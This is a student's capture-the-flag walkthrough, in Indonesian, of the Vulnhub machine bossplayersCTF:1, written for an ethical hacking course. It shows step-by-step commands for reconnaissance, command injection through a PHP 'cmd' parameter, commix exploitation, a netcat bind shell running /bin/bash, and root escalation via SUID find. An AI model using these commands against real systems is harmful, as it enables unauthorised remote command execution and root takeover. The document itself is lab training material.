| Nama | NRP | Kelas |
| :--: | :--: | :--: |
| Nabiel Nizar Anwari | 5027231087 | Ethical Hacking dan Uji Keamanan Siber (A) |

# WU_bossplayersCTF1-Vulnhub
Write Up BossPlayersCTF:1 VM Vulnhub

- [Download VM here](https://www.vulnhub.com/entry/bossplayersctf-1,375/)
```
About Release
    Name: bossplayersCTF:1
    Date release: 28 Sep 2019
    Author: Cuong Nguyen
    Series: bossplayersCTF
```

## Scanning Network dengan Netdiscover
**Tujuan :** Menemukan IP address dari target di jaringan lokal.  

`sudo netdiscover -r 192.168.87.0/24`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/netdiscover-2.png)

## Scanning Target dengan Nmap
**Tujuan:** Mengidentifikasi port terbuka dan layanan yang berjalan.

`sudo nmap 192.168.87.4 -A -p- -oN log-nmap.log`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/nmap.png)

## Melihat Halaman Utama HTTP
**Tujuan :** Mengeksplorasi halaman utama server HTTP.

`http://192.168.87.4/`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/http.png)

## Memeriksa robots.txt file
**Tujuan :** Mencari petunjuk tambahan.

URL : `http://192.168.87.4/robots.txt`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/robots-txt.png)

## Decode Password (Base64)
**Tujuan:** Mendekode string yang ditemukan.

`echo bG9sIHRyeSBoYXJkZXIgYnJvCg== | base64 -d`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/decode.png)


## Source Code Halaman Web

`Ctrl + U`

`WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/ctrl-u.png)

## Decode String Base64 Berulang
**Tujuan:** Mendekode string Base64 hingga teks asli ditemukan.

```
1. echo WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK | base64 -d
2. echo WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK | base64 -d | base64 -d
3. echo WkRJNWVXRXliSFZhTW14MVkwaEtkbG96U214ak0wMTFZMGRvZDBOblBUMEsK | base64 -d | base64 -d | base64 -d

```

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/decode-2.png)

## PHP File Target
**Tujuan:** Mengeksplorasi file PHP yang ditemukan.

`http://192.168.87.4/workinginprogress.php`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/url-1.png)

## Testing Command Injection (Whoami URL)
**Tujuan:** Menguji kerentanan Command Injection.

`http://192.168.87.4/workinginprogress.php?cmd=whoami`

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/url-2.png)

## Eksploitasi dengan Commix
**Tujuan:** Mengeksploitasi Command Injection menggunakan Commix.

`commix -u 'http://192.168.87.4/workinginprogress.php?cmd=whoami'`
```
nc -e /bin/bash -lvp 2048
```

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/commix.png)

## Mendapatkan Reverse Shell dengan Netcat
**Tujuan:** Mengakses shell dari mesin target.

`nc 192.168.87.4 2048`

```
uname -a

find / -perm -4000 -type f 2>/dev/null
```

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/nc.png)

## Privilege Escalation
**Tujuan:** Meningkatkan hak akses menjadi root.

```
find -exec bash -p \;
whoami
ls -al /root
cat /root/root.txt
cat /root/root.txt | base64 -d
```

![github-small](https://github.com/bielnzar/WU_bossplayersCTF1-Vulnhub/blob/main/assets/nc-2.png)

# Kesimpulan
> Pada akhir proses, berhasil mendapatkan akses root dan membaca file root.txt, yang merupakan flag dari mesin ini. Proses ini mencakup eksplorasi HTTP, eksploitasi command injection, dan privilege escalation. tools-tools seperti base64 decoding, Commix, dkk juga sangat membantu untuk bisa mengeksploitasi mesin ini